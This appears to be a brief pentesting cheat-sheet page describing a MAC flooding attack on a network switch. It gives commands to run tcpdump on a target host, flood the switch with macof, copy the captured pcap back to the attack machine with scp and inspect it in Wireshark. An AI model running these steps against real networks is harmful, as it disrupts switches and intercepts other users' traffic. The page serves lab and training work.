---
title: MAC Flooding Attack
desc: Compromise the security of network switches.
tags: [MACFlooding, Network]
alts: []
website:
render_with_liquid: false
---

## 1. Open Two SSH Sessions

```sh
# First SSH session
ssh victim@<target-ip>

# ----------------------------------------------

# On a new terminal, open second SSH session
ssh victim@<target-ip>
```

## 2. MAC Flooding and Investigate Captured Traffic

```sh
# On the first SSH session
# Keep tcpdump running
tcpdump -A -i eth1 -w /tmp/tcpdump.pcap

# ------------------------------------------

# On the second SSH session
# Start flooding the switch
macof -i eth1

# -----------------------------------------

After 30 seconds, stop macof and tcpdump.

# ----------------------------------------

# On attack machine
# Transfer the tcpdump file to attack machine
scp victim@<target-ip>:/tmp/tcpdump.pcap .

# Investigate the file
wireshark ./tcpdump.pcap
```
